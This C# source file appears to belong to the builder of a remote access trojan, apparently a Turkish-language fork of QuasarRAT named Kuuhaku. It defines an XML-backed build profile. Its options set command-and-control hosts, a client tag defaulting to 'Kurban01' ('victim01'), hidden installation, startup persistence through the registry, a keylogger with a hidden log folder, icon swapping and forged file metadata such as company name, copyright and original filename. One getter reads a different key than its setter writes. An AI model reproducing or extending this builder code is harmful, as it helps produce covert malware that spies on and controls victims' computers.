using System;
using System.IO;
using System.Windows.Forms;
using System.Xml;
using System.Xml.XPath;
using xServer.KuuhakuCekirdek.Yardımcılar;

namespace xServer.KuuhakuCekirdek.Veri
{
    public class KurulumProfili
    {
        private readonly string _profilePath;

        public KurulumProfili(string profileName)
        {
            if (string.IsNullOrEmpty(profileName)) throw new ArgumentException("Geçersiz Profil Yolu");
            _profilePath = Path.Combine(Application.StartupPath, "Profiller\\" + profileName + ".xml");
        }

        public string Hostlar
        {
            get { return ReadValueSafe("Hostlar"); }
            set { WriteValue("Hostlar", value); }
        }

        public string Etiket
        {
            get { return ReadValueSafe("Tag", "Kurban01"); }
            set { WriteValue("Etiket", value); }
        }

        public string Şifre
        {
            get { return ReadValueSafe("Şifre", Ayarlar.Password); }
            set { WriteValue("Şifre", value); }
        }

        public int Gecikme
        {
            get { return int.Parse(ReadValueSafe("Gecikme", "3100")); }
            set { WriteValue("Gecikme", value.ToString()); }
        }

        public string Mutex
        {
            get { return ReadValueSafe("Mutex", FormatYardımcısı.GenerateMutex()); }
            set { WriteValue("Mutex", value); }
        }

        public bool ClientKurumu
        {
            get { return bool.Parse(ReadValueSafe("ClientKurumu", "False")); }
            set { WriteValue("ClientKurumu", value.ToString()); }
        }

        public string Yüklemeİsmi
        {
            get { return ReadValueSafe("Yüklemeİsmi", "Client"); }
            set { WriteValue("Yüklemeİsmi", value); }
        }

        public short KurulumDizini
        {
            get { return short.Parse(ReadValueSafe("KurulumDizini", "1")); }
            set { WriteValue("KurulumDizini", value.ToString()); }
        }

        public string SubDirYükle
        {
            get { return ReadValueSafe("SubDirYükle", "SubDir"); }
            set { WriteValue("SubDirYükle", value); }
        }

        public bool DosyaSakla
        {
            get { return bool.Parse(ReadValueSafe("DosyaSakla", "False")); }
            set { WriteValue("DosyaSakla", value.ToString()); }
        }

        public bool BaşlangıcaEkle
        {
            get { return bool.Parse(ReadValueSafe("BaşlangıcaEkle", "False")); }
            set { WriteValue("BaşlangıcaEkle", value.ToString()); }
        }

        public string RegistryName
        {
            get { return ReadValueSafe("RegistryName", "Kuuhaku Client Başlangıç"); }
            set { WriteValue("RegistryName", value); }
        }

        public bool İkonDeğiştir
        {
            get { return bool.Parse(ReadValueSafe("İkonDeğiştir", "False")); }
            set { WriteValue("İkonDeğiştir", value.ToString()); }
        }

        public string IconPath
        {
            get { return ReadValueSafe("IconPath"); }
            set { WriteValue("IconPath", value); }
        }

        public bool ChangeAsmInfo
        {
            get { return bool.Parse(ReadValueSafe("ChangeAsmInfo", "False")); }
            set { WriteValue("ChangeAsmInfo", value.ToString()); }
        }

        public bool Keylogger
        {
            get { return bool.Parse(ReadValueSafe("Keylogger", "False")); }
            set { WriteValue("Keylogger", value.ToString()); }
        }

        public string LogDirectoryName
        {
            get { return ReadValueSafe("LogDirectoryName", "Kayıtlar"); }
            set { WriteValue("LogDirectoryName", value); }
        }

        public bool HideLogDirectory
        {
            get { return bool.Parse(ReadValueSafe("HideLogDirectory", "False")); }
            set { WriteValue("HideLogDirectory", value.ToString()); }
        }

        public string Ürünİsmi
        {
            get { return ReadValueSafe("Ürünİsmi"); }
            set { WriteValue("Ürünİsmi", value); }
        }

        public string Açıklama
        {
            get { return ReadValueSafe("Açıklama"); }
            set { WriteValue("Açıklama", value); }
        }

        public string Şirketİsmi
        {
            get { return ReadValueSafe("Şirketİsmi"); }
            set { WriteValue("Şirketİsmi", value); }
        }

        public string TelifHakkı
        {
            get { return ReadValueSafe("TelifHakkı"); }
            set { WriteValue("TelifHakkı", value); }
        }

        public string Trademarks
        {
            get { return ReadValueSafe("Trademarks"); }
            set { WriteValue("Trademarks", value); }
        }

        public string OriginalFilename
        {
            get { return ReadValueSafe("OriginalFilename"); }
            set { WriteValue("OriginalFilename", value); }
        }

        public string ÜrünVersiyonu
        {
            get { return ReadValueSafe("ÜrünVersiyonu"); }
            set { WriteValue("ÜrünVersiyonu", value); }
        }

        public string DosyaVersiyonu
        {
            get { return ReadValueSafe("DosyaVersiyonu"); }
            set { WriteValue("DosyaVersiyonu", value); }
        }

        private string ReadValue(string pstrValueToRead)
        {
            try
            {
                var doc = new XPathDocument(_profilePath);
                var nav = doc.CreateNavigator();
                var expr = nav.Compile(@"/ayarlar/" + pstrValueToRead);
                var iterator = nav.Select(expr);
                while (iterator.MoveNext())
                {
                    return iterator.Current.Value;
                }

                return string.Empty;
            }
            catch
            {
                return string.Empty;
            }
        }

        private string ReadValueSafe(string pstrValueToRead, string defaultValue = "")
        {
            var value = ReadValue(pstrValueToRead);
            return (!string.IsNullOrEmpty(value)) ? value : defaultValue;
        }

        private void WriteValue(string pstrValueToRead, string pstrValueToWrite)
        {
            try
            {
                var doc = new XmlDocument();

                if (File.Exists(_profilePath))
                {
                    using (var reader = new XmlTextReader(_profilePath))
                    {
                        doc.Load(reader);
                    }
                }
                else
                {
                    var dir = Path.GetDirectoryName(_profilePath);
                    if (!Directory.Exists(dir))
                    {
                        Directory.CreateDirectory(dir);
                    }
                    doc.AppendChild(doc.CreateElement("ayarlar"));
                }

                var root = doc.DocumentElement;
                var oldNode = root.SelectSingleNode(@"/ayarlar/" + pstrValueToRead);
                if (oldNode == null)
                {
                    oldNode = doc.SelectSingleNode("ayarlar");
                    oldNode.AppendChild(doc.CreateElement(pstrValueToRead)).InnerText = pstrValueToWrite;
                    doc.Save(_profilePath);
                    return;
                }
                oldNode.InnerText = pstrValueToWrite;
                doc.Save(_profilePath);
            }
            catch
            {
            }
        }
    }
}